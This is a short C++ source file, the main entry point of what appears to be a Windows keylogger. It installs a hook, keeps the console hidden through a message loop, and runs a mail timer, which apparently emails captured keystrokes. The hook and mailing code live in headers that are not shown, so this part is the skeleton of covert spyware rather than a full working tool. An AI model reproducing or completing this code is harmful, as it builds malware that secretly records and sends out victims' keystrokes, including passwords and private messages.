#include <iostream>
#include <windows.h>
#include "IO.h"
#include "Hooks.h"

using namespace std;



int main()
{

    MSG Msg;

    IO::MKDir(IO::GetOurPath(true));

    InstallHook();

   //Infinity Loop for hiding console window
    while(GetMessage(&Msg, NULL, 0, 0))
    {
       TranslateMessage(&Msg);
       DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
